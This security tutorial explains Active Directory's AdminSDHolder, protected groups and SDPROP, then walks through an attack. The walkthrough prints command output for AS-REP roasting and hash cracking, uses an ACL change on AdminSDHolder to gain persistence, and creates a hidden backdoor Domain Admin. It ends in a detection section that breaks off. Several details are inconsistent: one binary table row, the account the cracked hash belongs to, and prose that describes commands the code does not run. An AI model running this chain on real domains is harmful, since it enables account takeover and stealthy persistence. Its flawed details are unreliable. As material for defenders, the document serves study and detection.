# AS REP Roasting Attack via AdminSDHolder

AS-REP Roasting Attack via AdminSDHolder

At a glance:

* Overview of AdminSDHolder, protected groups, and SDPROP
* Controlling groups that are protected by AdminSDHolder
* Security Descriptor propagator

AdminSDHolder modification is a persistence technique in which an attacker exploits the Security Descriptor Propagation (SDProp) process in Active Directory to establish a persistent backdoor. The SDProp process is responsible for ensuring that the permissions on certain protected objects, such as users with Domain Admin privileges, are consistent with those defined in a special container called AdminSDHolder.

The AdminSDHolder object is a special Active Directory (AD) object that Microsoft uses to protect certain high-privilege groups from being modified by lower privilege users. The AdminSDHolder modification attack exploits this mechanism to escalate privileges within an AD environment. How this attack works:

* **SDProp Process:** By default, every hour, the SDProp process checks the permissions on protected objects in Active Directory (like Domain Admin accounts) and compares them with the permissions set on the AdminSDHolder container.
* **Permission Synchronization:** If the permissions on a protected object differ from those on AdminSDHolder, SDProp automatically replaces the permissions on the protected object with those defined on AdminSDHolder. This ensures that high-privilege accounts always maintain a consistent set of security descriptors.
* **Attack Exploitation:** An adversary who gains the ability to modify the AdminSDHolder container can establish a backdoor by altering the security descriptors on AdminSDHolder itself. Since SDProp periodically enforces these permissions, the attacker's changes will propagate to all protected objects, effectively creating a shadow administration path.
* **Persistence:** By controlling AdminSDHolder, the attacker ensures that even if their other traces are removed, they can regain administrative access whenever SDProp runs. This makes AdminSDHolder modification a powerful and stealthy persistence technique, as it can go unnoticed in typical security monitoring.

Furthermore, Active Directory Domain Services (AD DS) leverages the AdminSDHolder, along with protected groups and the Security Descriptor Propagator (commonly referred to as _**SDPROP**_), to safeguard privileged users and groups from accidental alterations. Introduced with the debut of Active Directory in Windows 2000 Server, this feature has become widely recognized over time. Despite its familiarity, many IT administrators have encountered challenges due to this functionality, issues that will persist unless they gain a comprehensive understanding of how AdminSDHolder, protected groups, and SDPROP operate together.

Within every Active Directory domain, an entity known as AdminSDHolder exists within the System container. This AdminSDHolder object possesses a distinct Access Control List (ACL) designed to manage the permissions of security principals who are part of built-in privileged Active Directory groups, often referred to as "protected" groups. On an hourly basis, a background process is executed on the domain controller holding the PDC Emulator operations master role. This process scrutinizes the ACLs of all security principals (including users, groups, and computer accounts) associated with protected groups against the ACL of the AdminSDHolder object. Should discrepancies in size or binary string be detected, the security descriptor of the affected object is replaced with the security descriptor from the AdminSDHolder object.

This mechanism incorporates several layers of security. Initially, the permissions assigned to users within protected groups are stricter compared to those applied to other user accounts by default. Additionally, inheritance is typically disabled for these privileged accounts, preventing them from inheriting permissions from parent objects, regardless of their location within the directory structure. Lastly, the hourly background process serves to identify and rectify manual adjustments made to ACLs, ensuring they align with the ACL defined by the AdminSDHolder object.

### The AdminSDHolder Object

As previously mentioned, each Active Directory domain includes an AdminSDHolder object located in the domain's System partition. The distinguished name of the AdminSDHolder object is:

CN=AdminSDHolder,CN=System,DC=domain,DC=com&#x20;

Here, DC=domain,DC=com represents the distinguished name of the domain.

The figure below displays the AdminSDHolder object in a Windows Server 2008 R2 domain.

![A screenshot of a computer

Description automatically generated](<../.gitbook/assets/0 (5).png>)

_**FIGURE X:** AdminSDHolder Object._

### DEFAULT ACL

The AdminSDHolder object is pivotal in securing privileged accounts, and its default Access Control List (ACL) is more restrictive than that of other objects such as the domain, organizational units (OUs), and containers.

### KEY CHARACTERISTICS OF ADMINSDHOLDER ACL

* **Default Owner:**
  * The default owner of the AdminSDHolder object is the Domain Admins group, which is relatively unusual since most Active Directory objects have the Administrators group as the default owner. This is significant because the owner of an object can reset permissions and control the object.
* **Inheritance Disabled:**
  * Inheritance is disabled by default on the AdminSDHolder object. This design ensures that no permissions are inherited from parent objects, maintaining strict control over its security settings.
* **Write Permissions:**
  * The write permissions for attributes on the AdminSDHolder object are restricted to the Administrators, Domain Admins, and Enterprise Admins groups. This is more stringent compared to the default permissions applied to other Active Directory objects.

#### _PROTECTED GROUPS:_

The AdminSDHolder permissions extend to security principals in protected groups. The list of these protected groups has evolved since the initial release of Active Directory in Windows 2000 Server.

### PROTECTED GROUPS IN WINDOWS SERVER 2022

In Windows Server 2022, the default list of protected groups (e.g., those whose ACLs are enforced by AdminSDHolder) includes the following four security groups:

**1. Domain Admins**

* Members have full administrative rights to the domain.

**2. Enterprise Admins**

* Members have full administrative rights across the entire forest.

**3. Schema Admins**

* Members can modify the schema of Active Directory.

**4. Administrators**

* Members have full control over the local machine or domain, depending on the context.

These groups are protected to ensure that their security settings are strictly enforced and not inadvertently altered by changes in inheritance or other modifications.

### A Common Example of the Impact of AdminSDHolder, Protected Groups, and SDPROP

Many Active Directory administrators encounter the effects of AdminSDHolder, protected groups, and SDPROP through scenarios like the following:

You delegate specific permissions to an Organizational Unit (OU). Initially, the permissions seem correctly applied to most user accounts within the OU; however, you later find that some user accounts do not have the permissions you delegated. Upon investigation, you discover that the ACL on these affected accounts differs from the intended settings, and inheritance is not enabled. You enable inheritance to resolve the issue, which works temporarily. But eventually, the problem reappears. The ACL on the affected accounts is altered again, and inheritance is disabled.

This issue seems to recur endlessly for some administrators.

### Root Cause

This situation is actually by design and stems from how AdminSDHolder, protected groups, and SDPROP function:

**1. Protected Groups:**

* The affected accounts belong to a protected group, which means their ACLs are managed by the AdminSDHolder object in the domain.

**2. AdminSDHolder and ACL Inheritance:**

* The AdminSDHolder object has a specific ACL that is applied to the accounts in protected groups. By default, inheritance is disabled on these accounts to ensure that the ACL set by AdminSDHolder remains consistent.

**3. SDPROP Process:**

* Every 60 minutes, a background process on the domain controller holding the PDC Emulator role (SDPROP) checks and enforces the ACL settings of these protected accounts to match the AdminSDHolder object. This process ensures that any manual changes, such as enabling inheritance, are reverted, and the ACL is restored to match AdminSDHolder’s settings.

When you delegate permissions to an OU, they are not applied to accounts in protected groups as long as they inherit their ACL settings from AdminSDHolder. When you enable inheritance, the permissions are temporarily applied, but the SDPROP process will overwrite these changes, restoring the ACLs to those defined by AdminSDHolder and disabling inheritance again. Understanding this behavior is crucial to managing permissions effectively in Active Directory.

### Controlling Groups Protected by AdminSDHolder

In my experience, certain default protected groups can cause issues with AdminSDHolder. For instance, the **Print Operators** group is a protected group due to its elevated permissions on domain controllers, even though it's often used for print services management rather than Active Directory management. To mitigate this issue, it's a best practice to remove the elevated permissions from this group on domain controllers. By following this best practice, you may not need to protect this group with AdminSDHolder.

You can exclude specific groups from the AdminSDHolder process, including:

* **Account Operators**
* **Server Operators**
* **Print Operators**
* **Backup Operators**

### Controlling Protected Groups

The ability to manage which groups are protected by AdminSDHolder was introduced via a hotfix for RTM versions of Windows 2000 Server and Windows Server 2003. This capability is included in the latest service pack for Windows Server 2003 and in RTM versions of Windows Server 2008 and Windows Server 2008 R2. For details on the hotfix, refer to the Delegated permissions are not available, and inheritance is automatically disabled document at _(**Source:** https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc757157(v=ws.10))._

To control which groups are protected by AdminSDHolder, you need to modify the **dsHeuristic** flag. This flag is a Unicode string where each character represents a forest-wide setting. Character position 16 (in hexadecimal notation) indicates the relevant setting, with each bit representing a specific group. The valid values for this setting range from "0" to "f."

#### _EXAMPLE OF MODIFYING dsHEURISTIC_

For instance, if you want to exclude the **Print Operators** group from being protected by AdminSDHolder, you will modify the dsHeuristic flag accordingly. Each group has a specific bit position as illustrated in the following figure:

* **Bit 0:** Account Operators
* **Bit 1:** Server Operators
* **Bit 2:** Print Operators
* **Bit 3:** Backup Operators

The table below shows the bit positions for each group.

| Bit | Group to Exclude  | Binary Value | Hexadecimal Value |
| --- | ----------------- | ------------ | ----------------- |
| 0   | Account Operators | 0001         | 1                 |
| 1   | Server Operators  | 0010         | 2                 |
| 2   | Print Operators   | 0100         | 4                 |
| 3   | Backup Operators  | 1000         | 8                 |

Excluding multiple groups from AdminSDHolder can be complex due to the need to handle various combinations of exclusions. Here's how you can manage these exclusions effectively:

### Excluding Multiple Groups from AdminSDHolder

To exclude more than one group from AdminSDHolder, you need to combine the binary values for each group and convert the result into a hexadecimal value. Each group has a specific binary value as follows:

* **Account Operators:** 0001
* **Server Operators:** 0010
* **Print Operators:** 0100
* **Backup Operators:** 1000

#### _Steps to Combine Exclusions_

**1. Determine Binary Values:**

* Each group has a specific binary representation.

**2. Add Binary Values:**

* Combine the binary values of the groups you want to exclude. For example:
  * **Print Operators** (0100) + **Backup Operators** (1000) = 1100 (binary).

**3. Convert to Hexadecimal:**

* Convert the binary result to hexadecimal. For the example above:
  * **1100** (binary) = **C** (hexadecimal).

#### _Example Calculation:_

To exclude **Print Operators** and **Backup Operators:**

**1. Binary values:**

* Print Operators: 0100
* Backup Operators: 1000

**2. Binary addition:**

* 0100 (Print Operators)
* 1000 (Backup Operators)
* Sum: 1100

**3. Convert to hexadecimal:**

* **1100** (binary) = **C** (hexadecimal)

#### _REFERENCE TABLE_

For convenience, here’s a reference for all possible combinations:

| Groups Excluded                                                                          | Binary | Hexadecimal |
| ---------------------------------------------------------------------------------------- | ------ | ----------- |
| Account Operators                                                                        | 0001   | 1           |
| Server Operators                                                                         | 0010   | 2           |
| Print Operators                                                                          | 0100   | 4           |
| Backup Operators                                                                         | 1000   | 8           |
| Account Operators + Server Operators                                                     | 0011   | 3           |
| Account Operators + Print Operators                                                      | 1010   | 5           |
| Account Operators + Backup Operators                                                     | 1001   | 9           |
| Server Operators + Print Operators                                                       | 0110   | 6           |
| Server Operators + Backup Operators                                                      | 1010   | A           |
| Print Operators + Backup Operators                                                       | 1100   | C           |
| All Excluded (Account Operators + Server Operators + Print Operators + Backup Operators) | 1111   | F           |

The table below illustrates these combinations in binary and hexadecimal formats, making it easier to manage exclusions based on your requirements.

| Group(s) to Exclude                                                                          | Binary Value                     | Hexadecimal Value |
| -------------------------------------------------------------------------------------------- | -------------------------------- | ----------------- |
| None (Default)                                                                               | 0                                | 0                 |
| Account Operators                                                                            | 1                                | 1                 |
| Server Operators                                                                             | 10                               | 2                 |
| <p>Account Operators</p><p>Server Operators</p>                                              | 0001 + 0010 = 0011               | 3                 |
| Print Operators                                                                              | 100                              | 4                 |
| <p>Account Operators</p><p>Print Operators</p>                                               | 0001 + 0100 + 0101               | 5                 |
| <p>Server Operators</p><p>Print Operators</p>                                                | 0010 + 0100 + 0110               | 6                 |
| <p>Account Operators</p><p>Server Operators</p><p>Print Operators</p>                        | 0001 + 0010 + 0100 = 0111        | 7                 |
| Backup Operators                                                                             | 1000                             | 8                 |
| <p>Account Operators</p><p>Backup Operators</p>                                              | 0001 + 1000 + 1001               | 9                 |
| <p>Server Operators</p><p>Backup Operators</p>                                               | 0010 + 1000 + 1010               | A                 |
| <p>Account Operators</p><p>Server Operators</p><p>Backup Operators</p>                       | 0001 + 0010 + 1000 = 1011        | B                 |
| <p>Print Operators</p><p>Backup Operators</p>                                                | 0100 + 1000 = 1100               | C                 |
| <p>Account Operators</p><p>Print Operators</p><p>Backup Operators</p>                        | 0001 + 0100 + 1000 = 1101        | D                 |
| <p>Server Operators</p><p>Print Operators</p><p>Backup Operators</p>                         | 0010 + 0100 + 1000 = 1110        | E                 |
| <p>Account Operators</p><p>Server Operators</p><p>Print Operators</p><p>Backup Operators</p> | 0001 + 0010 + 0100 + 1000 = 1111 | F                 |

After deciding which group(s) you want to exclude, you’re now ready to modify the dsHeuristics attribute.

### Modifying the Frequency of the AdminSDHolder Background Process

If the default frequency of 60 minutes for the AdminSDHolder background process isn't suitable for your needs, you can adjust it by modifying the registry entry for \`AdminSDProtectFrequency\`. This setting controls how often the process runs, which checks and enforces ACLs for protected groups.

#### _Steps to Modify the Frequency:_

**1. Open the Registry Editor:**

* Press Win + R, type regedit, and press **Enter**.

**2. Navigate to the Registry Key, go to:**

HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters&#x20;

**3. Create or Modify the Registry Entry:**

* If the AdminSDProtectFrequency entry does not exist, you need to create it.
* To create or modify the entry, use the following command in Command Prompt (run as Administrator):

REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG\_DWORD /F /D 600

* This command sets the frequency to 10 minutes (600 seconds). You can adjust the value as needed, within the range of 1 minute (60 seconds) to 2 hours (7200 seconds).

#### _Important Considerations_

* **Default Frequency:**
  * If the AdminSDProtectFrequency registry entry does not exist, the system uses the default frequency of 60 minutes.
* **Performance Impact:**
  * Modifying this registry setting can increase the Local Security Authority (LSA) processing overhead. A more frequent background process might put additional strain on your domain controllers.

Understand that by changing the frequency of the AdminSDHolder background process, you can control how often ACLs are checked and enforced for protected groups.

**WARNING: ; Be cautious with increasing the frequency due to potential performance impacts. Ensure that changes align with your organization's needs and monitoring capacity.**

### Determining Whether a Security Principal Is Protected by AdminSDHolder

AdminSDHolder provides protection to certain users and groups within Active Directory. Protection is granted based on direct or transitive membership in security or distribution groups, as distribution groups can be converted into security groups.

### Understanding Protection Through Group Membership

For example, if a user is a member of a distribution list (DL) named **Canada IT**, and this DL is a member of the **North American IT Security** group, which in turn is a member of the **Administrators** group, then the user’s account is protected by AdminSDHolder due to the transitive group membership.

### How to Determine Protected Security Principals

To identify which users and groups are protected by AdminSDHolder in your domain, you can use the adminCount attribute. Here’s how to do it:

1. **Querying Users Protected by AdminSDHolder**

* You can use the **ADFind** tool to find all user objects that are protected by AdminSDHolder. The command is:

Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=person)(samaccountname=\*)(admincount=1)" -dn

* Replace DC=domain,DC=com with your domain’s distinguished name.

1. **Querying Groups Protected by AdminSDHolder**

* To find all groups that are protected by AdminSDHolder, use the following command:

Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=group)(admincount=1)" -dn&#x20;

* Again, replace DC=domain,DC=com with your domain’s distinguished name.

### Orphaned AdminSDHolder Objects

An issue arises when users are removed from protected groups. The adminCount attribute remains set to 1, and inheritance is not automatically adjusted. Consequently, these accounts become "orphaned AdminSDHolder objects"—they no longer receive ACLs from AdminSDHolder and do not inherit permissions from parent objects if inheritance was not previously enabled.

**Handling Orphaned AdminSDHolder Objects**

There is no automatic fix for re-enabling inheritance on orphaned AdminSDHolder objects. You need to handle these objects manually. Microsoft provides a VB Script to assist in re-enabling inheritance for user accounts that were previously in protected groups. You can find the VB Script under the \[Delegated permissions are not available and inheritance is automatically disabled]\(https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771070(v=ws.10)) documentation.

Understanding and managing AdminSDHolder protections involves querying the \`adminCount\` attribute and dealing with orphaned objects manually when users are removed from protected groups. Using tools like ADFind and scripts provided by Microsoft helps in maintaining proper security configurations within your Active Directory environment.

By understanding and applying these modifications, you can better manage which groups are subject to the AdminSDHolder protection, helping to streamline permission management and reduce unnecessary complications.

\### Security Descriptor Propagator (SDPROP)

The Security Descriptor Propagator Update (SDPROP) task is responsible for propagating changes in inheritable Access Control Entries (ACEs) to descendant objects in Active Directory. This background task runs on domain controllers to ensure that security descriptors are updated correctly when an object’s security settings are modified or when an object is moved.

\### Forcing SDPROP to Run

Sometimes you might need to force SDPROP to run, especially when testing changes or if you need immediate evaluation of inherited permissions. Here’s how to manually trigger the SDPROP process:

1\. \*\*Open LDP Utility:\*\*

\- Go to \*\*Start\*\*.

\- Click \*\*Run\*\*.

\- Type \`LDP.exe\` and click \*\*OK\*\*.

2\. \*\*Connect to the Server:\*\*

\- On the \*\*Connection\*\* menu in the LDP console, click \*\*Connect\*\*.

\- In the \*\*Connect\*\* dialog box, enter the server name you wish to connect to in the \*\*Server\*\* field and ensure that port \*\*389\*\* is listed. Click \*\*OK\*\*.

3\. \*\*Bind to the Server:\*\*

\- On the \*\*Connection\*\* menu, click \*\*Bind\*\*.

\- In the \*\*Bind\*\* window, select \*\*Bind as the currently logged-on user\*\* or \*\*Bind with Credentials\*\* if you need to provide specific credentials. Click \*\*OK\*\*.

4\. \*\*Modify the Attribute:\*\*

\- On the \*\*Browse\*\* menu, select \*\*Modify\*\*.

\- In the \*\*Modify\*\* dialog box, leave the \*\*DN\*\* field empty.

\- Type \`FixUpInheritance\` into the \*\*Attribute\*\* field.

\- Type \`Yes\` into the \*\*Value\*\* field.

\- Select the \*\*Add\*\* operation and click \*\*Enter\*\*.

5\. \*\*Run the Modification:\*\*

\- In the \*\*Modify\*\* dialog box, click \*\*Run\*\*.

\- The \*\*Details\*\* pane will display the status of the modification.

This process will manually initiate the SDPROP task and trigger an update of inherited permissions for objects in Active Directory.

\### Summary

SDPROP ensures that security settings are consistently applied across all relevant objects. Forcing SDPROP to run is useful for immediate updates and testing changes. By using the LDP tool and following the steps outlined, you can manually initiate the propagation process and ensure that your Active Directory environment is up to date.

![A computer screen shot of a computer program

Description automatically generated](<../.gitbook/assets/1 (4).png>)

Figure X: **The Modify Window. When Forcing SDPROP to run in the Modify dialog box, click Run. The Details pane will be similar to the highlighted text in the figure below.**

![A computer screen shot of a computer

Description automatically generated](<../.gitbook/assets/2 (4).png>)

When you’re forcing SDPROP to run in the Modify dialog box, click \*\*Run\*\*. The \*\*Details\*\* pane will display information similar to the highlighted text in the above figure.

![](<../.gitbook/assets/3 (4).png>)

\### Figure 6: Call Modify Operation in LDP.exe

At this point, SDPROP should start initializing. The duration of the SDPROP process varies based on the size of your Active Directory environment; larger environments will experience a longer processing time. You can track the progress of SDPROP by monitoring the DS Security Propagation Events counter within the NTDS Performance object. Completion of the process is indicated by a counter value of 0.

Wrapping Up

The AdminSDHolder is a crucial security feature in Active Directory, designed to protect user accounts with elevated permissions. AdminSDHolder, along with protected groups and the Security Descriptor Propagator (SDPROP), ensures that security settings are consistently applied and maintained for sensitive accounts. Over time, Microsoft has enhanced AdminSDHolder’s functionality, expanding the number of protected objects, allowing for exclusions, and providing more control over its operation frequency.

Understanding AdminSDHolder and its associated mechanisms is essential for managing Active Directory permissions effectively. This knowledge helps avoid common pitfalls, such as issues arising from the inheritance of permissions and ensures proper cleanup when modifying protected group memberships.

\### How to Use the \`dsHeuristics\` Attribute to Exclude Groups from AdminSDHolder

The \`dsHeuristics\` attribute can be used to exclude specific groups from AdminSDHolder protection. To modify this attribute on Windows Server 2008 R2, follow these steps:

1\. \*\*Open ADSI Edit:\*\*

\- Go to \*\*Start\*\*.

\- Click \*\*Run\*\*, type \`adsiedit.msc\`, and click \*\*OK\*\*.

2\. \*\*Connect to the Domain:\*\*

\- In ADSI Edit, right-click on \*\*ADSI Edit\*\* and select \*\*Connect to\*\*.

\- Ensure \*\*Connection Point\*\* is set to \*\*Default naming context\*\* and click \*\*OK\*\*.

3\. \*\*Locate the Configuration Container:\*\*

\- Expand the tree and navigate to the \*\*Configuration\*\* container.

4\. \*\*Find and Edit the \`dsHeuristics\` Attribute:\*\*

\- Go to \*\*CN=Configuration,DC=domain,DC=com\*\* (replace \`DC=domain,DC=com\` with your domain's distinguished name).

\- Right-click on \*\*CN=Directory Service\*\* and select \*\*Properties\*\*.

\- Locate the \`dsHeuristics\` attribute and click \*\*Edit\*\*.

5\. \*\*Modify the Attribute Value:\*\*

\- The \`dsHeuristics\` attribute is a Unicode string where each character represents a setting. Character position 16 (hexadecimal) controls the exclusion of protected groups.

\- Convert the binary values of the groups you want to exclude into hexadecimal. For instance, to exclude Print Operators (binary \`0100\`) and Backup Operators (binary \`1000\`), sum their binary values (1100) and convert to hexadecimal (\`C\`).

\- Modify the \`dsHeuristics\` attribute to include this value and save the changes.

6\. \*\*Apply Changes:\*\*

\- Click \*\*OK\*\* to apply the modifications and close ADSI Edit.

By following these steps, you can manage which groups are protected by AdminSDHolder and tailor your Active Directory environment to your organization's needs.

**How the AdminSDHolder Modification Attack Works**

1. **Acquiring Admin Privileges**

In this initial phase of the attack, the attacker needs to gain control over a user account that has sufficient privileges to modify the ACL (Access Control List) of the AdminSDHolder object. Typically, this requires at least domain admin rights or equivalent. In our example below, we utilize the **Rubeus** tool to _**AS-REP roast**_ a privileged user (YvonneA) with Kerberos pre-authentication disabled.

PS> .\Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat

\[\*] Action: AS-REP roasting

\[\*] Target Domain : domain.com

\[\*] Target DC : dc1

\[\*] Searching path 'LDAP://dc1/DC=domain,DC=com' for AS-REP roastable users

\[\*] SamAccountName :yvonnea

\[\*] DistinguishedName : CN=Yvonne Angelica,OU=Users,OU=Admin,DC=domain,DC=com

\[\*] Using domain controller: dc1 (10.154.201.1)

\[\*] Building AS-REQ (w/o preauth) for: 'domain.com\yvonnea'

\[+] AS-REQ w/o preauth successful!

\[\*] Hash written to c:\Tools\Ghostpack\dotnet v4.5 compiled binaries\hashes.txt

\[\*] Roasted hashes written to : c:\Tools\Ghostpack\dotnet v4.5 compiled binaries\hashes.txt

PS> .\hashcat.exe -m 18200 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt

...

Session..........: hashcat

Status...........: Cracked

Hash.Name........: Kerberos 5, etype 23, AS-REP

Hash.Target......: $krb5asrep$23$joed@domain.com:e7d1f...2ac95c

Time.Started.....: Thu Jul 23 18:58:36 2020 (0 secs)

Time.Estimated...: Thu Jul 23 18:58:36 2020 (0 secs)

Guess.Base.......: File (.\wordlist.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........: 97694 H/s (0.26ms) @ Accel:256 Loops:1 Thr:64 Vec:1

Recovered........: 1/1 (100.00%) Digests

Progress.........: 100/100 (100.00%)

Rejected.........: 0/100 (0.00%)

Restore.Point....: 0/100 (0.00%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidates.#1....: 123456 -> taylor

Hardware.Mon.#1..: Temp: 47c Fan: 34% Util: 32% Core:1265MHz Mem:2504MHz Bus:16

PS> Get-Content .\cracked.txt

$krb5asrep$23$joed@domain.com:e7d1f86a67ca41137f9a0b45d24f5795$3f8e0e7a0d8055d91a3fa2c67b537949e7dc30f41b797e01fa459d774d0c10c3fbc2488c7bb634db93118bb5a8dfe99107899f56e2542d39fef9b27d893fbaa5e92acd207b059b548d456f9daa18b24f0c9e83af16898eec8e9dbde3128772924a3f10e09cd66fbede311b3c3a4aa45d9feb6c49178dbab65dd8e38af89b3ac0fad7bde16b0bb50e25c8f6f92d29d5d3a9dc8e633e31db73dd06aa2e2a5e97053f73fada97564248d048fc74b7e13d56016210e6a3d1f4e4c7cafb60007bec16d682b3fd210bdaa1d2f3d44c717f19cf1583e814d92ace43991d132be1897ebeaa8b78daa7b29f1a3e03301c3920da1cf9bd8a887a92fc79280734e5acb2fadcfa05895f0f2ac95c:P@ssword!23

\# domain\yvonnea has a password of: P@ssword!23

1. **Modify the AdminSDHolder’s Access Control List (ACL)**

Once the attacker has the necessary privileges, they can modify the ACL of the AdminSDHolder object to grant themselves or another account specific permissions on protected objects. This is done by adding an ACE (Access Control Entry) to the AdminSDHolder object’s security descriptor.

The example below illustrates the successful cracking of the password hash for the YvonneA account obtained through AS-REP roasting, the adversary authenticates with the password and uses PowerSploit’s Add-DomainObjectACL cmdlet to grant all privileges on the AdminSDHolder container to a normal user they’d previously compromised (CarlosO). The next time the SDProp process runs, CarlosO’s new privileges will be applied to all protected objects.

PS> runas /noprofile /user:domain\yvonnea powershell.exe

\# --- New Window Opens --- #

PS> Import-Module .\PowerSploit.psd1

PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System' -PrincipalIdentity CarlosO -Rights All

PS> # Confirming Permissions Added

PS> Get-DomainObjectAcl -Identity \`CN=AdminSDHolder,CN=System\` -ResolveGUIDs

InheritedObjectType : All

ObjectDN : CN=AdminSDHolder,CN=System,DC=Domain,DC=com

ObjectType : All

IdentityReference : Domain\CarlosO

IsInherited : False

ActiveDirectoryRights : GenericAll

PropagationFlags : None

ObjectFlags : None

InheritanceFlags : None

InheritanceType : None

AccessControlType : Allow

ObjectSID :

This command adds the AttackerAccount (CarlosO) to the Domain Admins group granting it administrative privileges and is initially accomplished via vulnerability exploitation like spearphishing attacks, or by other methods to initially compromise an account with such privileges. An ACE is also added to the AdminSDHolder object’s ACL, granting “GenericAll” permission to ‘Everyone.’ This is highly simplified; in practice, attackers would likely target specific accounts or groups rather than ‘Everyone.’

1. **User Permissions to Regain Access**

After modifying the AdminSDHolder object’s ACL, the attacker waits for the SDProp process (which runs every hour by default) to replicate these changes to all protected groups and users. Once replicated these changes to all protected groups and users. Once replicated, the attacker can then use the newly granted permissions to perform actions such as resetting passwords or modifying group memberships of protected accounts.

PS> Add-ADGroupMember -Identity "Domain Admins" -Members CarlosO

PS> # Re-authenticate as User1 to get updated group membership or if no password then wait until user re-autenticates

PS> runas.exe /user:domain\CarlosO powershell

PS> New-ADOrganizationalUnit -Path "DC=domain,DC=com" -Name "Users"

PS> New-ADUser -AccountPassword (ConvertTo-SecureString -AsPlainText -Force -String "MySimplePassword123!") -SamAccountName NinaS -Name "Nina Smith" -DisplayName "Nina Sylvia" -EmailAddress "Nina.Syliva@domain.com" -PasswordNeverExpires $True -Path "OU=Users,DC=domain,DC=com"

PS> Add-ADGroupMember -Identity "Domain Admins" -Members NinaS

PS> # Hide the NinaS and Users OU

PS> Import-Module RACE.psm1

PS> Set-ADACL -SamAccountName Everyone -Right ReadProperty -Type Deny -DistinguishedName (Get-ADUser NinaS)

PS> Set-ADACL -SAMAccountName Everyone -Right ListChildren -Type Deny -DistinguishedName "OU=Users,DC=domain,DC=com"

PS> # Remove CarlosO from Domain Admins to hide privileges

PS> Remove-ADGroupMember -Identity "Domain Admins" -Members CarlosO

PC>

This command resets the password of a ProtectedAccount (NinaS), which now has its permissions modified due to the earlier ACL change on the AdminSDHolder object. With the new password, the attacker can log in as the ProtectedAccount and potentially gain further access or perform malicious activities within the network.

**Detect, Mitigate, and Respond**

**Detect**

**Difficulty: Low**

Monitoring changes to the AdminSDHolder container ACL is crucial for detecting potentially malicious activities within an Active Directory environment. Normally, modifications to the AdminSDHolder should be rare occurrences and strictly adhere to established change control procedures.

Windows Event ID 5136, found under the Audit Directory Service Changes subcategory of the Windows event log, is instrumental in tracking changes made to directory services. To specifically identify alterations to the AdminSDHolder container ACL, focus on events where the ObjectDN matches “CN=AdminSDHolder,CN=System” and the AttributeLDAPDisplayName corresponds to ‘nTSecurityDescriptor.’

Utilizing the XPath filter below in the Windows Event Viewer can aid in pinpointing modifications to the AdminSDHolder container ACL:

\<QueryList>

\<Query Id="0" Path="Security">

\<Select Path="Security">

\*\[System\[(EventID=5136)]]

and

\*\[EventData\[Data\[@Name='ObjectDN'] and (Data='CN=AdminSDHolder,CN=System,DC=YourDomain,DC=com')]]

and

\*\[EventData\[Data\[@Name='AttributeLDAPDisplayName'] and (Data='nTSecurityDescriptor')]]

\</Select>

\</Query>

\</QueryList>

Upon identifying a matching event, the AttributeValue, initially presented in SDDL (Security Descriptor Definition Language) format, can be converted into a human-readable format using PowerShell’s ConvertFrom-SddlString cmdlet. This conversation facilitates understanding the specifics of the ACL modifications.

Example PowerShell command to decode the SDDL format:

$ACL = ConvertFrom-SddlString -Sddl "O:DAG:DAD:PAI(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-5840559-2756745051-1363507867-1127)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-5840559-2756745051-1363507867-1129)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;LCRPRC;;;S-1-5-21-5840559-2756745051-1363507867-4102)(A;;RPWP;;;S-1-5-21-5840559-2756745051-1363507867-1127)(A;;RPWP;;;S-1-5-21-5840559-2756745051-1363507867-1129)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-5840559-2756745051-1363507867-519)(A;;LCRPLORC;;;RU)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:AI(AU;SA;WPWDWO;;;WD)(OU;CIIOIDSA;LCRPRC;;bf967aae-0de6-11d0-a285-00aa003049e2;WD)(OU;CIIDSA;CR;89e95b76-444d-4c62-991a-0facbeda640c;;DU)(OU;CIIDSA;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;DU)(OU;CIIDSA;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DU)(OU;CIIOIDSA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CIIOIDSA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;CIIDSA;LCRPWPRC;;;DU)"

$ACL.DiscretionaryACL

This command decodes the SDDL string into a more readable format, revealing the permissions granted or denied to various security principals. For instance, the output might indicate that a user named CarlosO has been granted extensive permissions, including FullControl over certain resources, which could warrant further investigation if unexpected or unauthorized.

Monitoring and understanding these changes are essential for maintaining the integrity and security of your client’s Active Directory environment, enabling timely detection and mitigation of potential threats.

**Mitigate**

**Difficulty: Medium**

The AdminSDHOlder container plays a pivotal role within Active Directory, serving as a proactive measure for high-privilege groups and users. By design, modifications to its Access Control List (ACL) are restricted to individuals possessing administrative rights within Active Directory. To safeguard against unauthorized alterations, the following processes should be conducted:

